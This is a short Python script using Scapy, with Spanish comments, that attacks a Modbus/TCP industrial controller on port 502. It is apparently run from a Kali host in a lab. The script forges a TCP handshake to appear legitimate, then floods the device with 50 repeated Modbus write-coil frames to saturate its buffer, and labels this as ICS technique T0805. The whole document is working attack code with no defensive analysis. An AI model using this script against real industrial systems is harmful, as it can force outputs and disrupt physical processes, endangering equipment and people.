from scapy.all import *
import time

IP_VICTIMA = "192.168.70.129"
IP_KALI = "192.168.70.150"
PORT = 502

# 1. Handshake Completo (Para parecer tráfico legítimo)
syn = IP(src=IP_KALI, dst=IP_VICTIMA)/TCP(sport=49152, dport=PORT, flags="S", seq=1000)
syn_ack = sr1(syn, verbose=0)
ack = IP(src=IP_KALI, dst=IP_VICTIMA)/TCP(sport=49152, dport=PORT, flags="A", seq=1001, ack=syn_ack.seq + 1)
send(ack, verbose=0)

# 2. Inundación (Serial Buffer Saturation)
# Usamos la secuencia 1001 tras el handshake
garbage_data = bytes.fromhex("01050001FF00") * 10 

print("[*] Conexión establecida. Iniciando saturación del Buffer...")

for i in range(50):
    # Mantenemos el mismo flujo de sesión
    pkt = IP(src=IP_KALI, dst=IP_VICTIMA)/TCP(sport=49152, dport=PORT, flags="PA", seq=1001, ack=syn_ack.seq + 1)/Raw(load=garbage_data)
    send(pkt, verbose=0)
    time.sleep(0.02) 

print("[*] Ataque T0805 finalizado.")
